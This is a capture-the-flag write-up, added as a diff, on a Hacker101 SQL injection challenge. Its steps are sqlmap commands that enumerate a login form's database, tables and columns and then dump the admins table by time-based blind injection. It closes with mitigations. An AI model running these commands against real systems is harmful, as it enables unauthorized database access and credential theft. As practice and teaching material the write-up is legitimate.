@@ -1,0 +1,54 @@
+## **SQL Injection - Hacker101 CTF Challenge**  
+
+### **Overview**  
+This write-up documents a successful SQL Injection attack performed against a vulnerable login form in the [Hacker101 CTF](https://ctf.hacker101.com/). Using SQLMap, we were able to enumerate the database structure and dump credentials, leading to flag retrieval.  
+
+### **Steps Taken**  
+
+1. **Identifying the Injection Point**  
+   - Tested the login form with random credentials (`admin:test`).  
+   - Captured the **POST request** using Burp Suite or a browser's developer tools.  
+
+2. **Enumerating the Database**  
+   - Used SQLMap to determine the database system and check for injectable parameters:  
+     ```bash
+     sqlmap -u "https://<target>/login" --data "username=admin&password=test" --batch --dbs
+     ```  
+   - Found that the backend was **MySQL (MariaDB fork)**.  
+
+3. **Enumerating Tables**  
+   - Listed tables in the vulnerable database:  
+     ```bash
+     sqlmap -u "https://<target>/login" --data "username=admin&password=test" -D level2 --tables --batch
+     ```  
+   - Found two tables: **admins** and **pages**.  
+
+4. **Extracting Credentials**  
+   - Retrieved column names from the `admins` table:  
+     ```bash
+     sqlmap -u "https://<target>/login" --data "username=admin&password=test" -D level2 -T admins --columns --batch
+     ```  
+   - Found columns: `id`, `username`, and `password`.  
+
+5. **Dumping Credentials**  
+   - Extracted admin credentials using time-based blind SQL injection:  
+     ```bash
+     sqlmap -u "https://<target>/login" --data "username=admin&password=test" -D level2 -T admins --dump --time-sec=20 --batch
+     ```  
+   - Credentials retrieved:  
+     ```
+     username: admin  
+     password: [hashed or plaintext]  
+     ```  
+   - Used the credentials to log in and capture the flag.  
+
+### **Lessons Learned**  
+- Time-based blind SQLi is **slow** but effective.  
+- Increasing `--time-sec` improves stability but lengthens execution time.  
+- Column enumeration may require `--no-cast` or `--hex` in case of errors.  
+- Always verify extracted credentials against the login page.  
+
+### **Mitigation Strategies**  
+- Use **prepared statements** and **parameterized queries**.  
+- Implement **Web Application Firewalls (WAFs)** to detect and block SQLi attempts.  
+- Limit error messages to avoid revealing database structure.  
